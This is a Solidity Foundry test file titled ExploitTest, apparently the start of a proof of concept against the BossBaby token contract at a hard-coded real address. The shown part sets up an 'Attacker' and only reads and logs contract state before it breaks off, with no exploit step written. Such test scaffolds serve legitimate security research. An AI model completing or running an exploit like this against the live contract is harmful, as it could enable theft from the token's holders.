interface BossBaby {
    function owner() external view returns (address);
    function setSwapTokensAtAmount(uint256 newAmount) external;
    function enableTrading() external;
    function changeMarketingWallet(address _marketingWallet) external;
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
    function tradingEnabled() external view returns (bool);
    function marketingWallet() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    address ownerAddress; // Renamed to avoid shadowing

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address from contract
        ownerAddress = BossBaby(TARGET).owner();

        // Label addresses for clarity
        vm.label(ownerAddress, 'Owner');
        vm.label(TARGET, 'BossBaby Token');
        vm.label(attacker, 'Attacker');

        // Give attacker some ETH to start
        deal(attacker, 100 ether);

        // Get the Uniswap pair address
        address pair = BossBaby(TARGET).uniswapV2Pair();
        vm.label(pair, 'Uniswap Pair');
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Check contract state
        address owner = BossBaby(TARGET).owner();
        console.log('Owner:', owner);
        bool tradingEnabled = BossBaby(TARGET).tradingEnabled();
        console.log('Trading enabled:', tradingEnabled);
        require(tradingEnabled, 'Trading must be enabled');

        address marketingWallet = BossBaby(TARGET).marketingWallet();
        console.log('Marketing wallet:', marketingWallet);
        uint256 swapThreshold = BossBaby(TARGET).swapTokensAtAmount();
        console.log('Swap threshold:', swapThreshold);

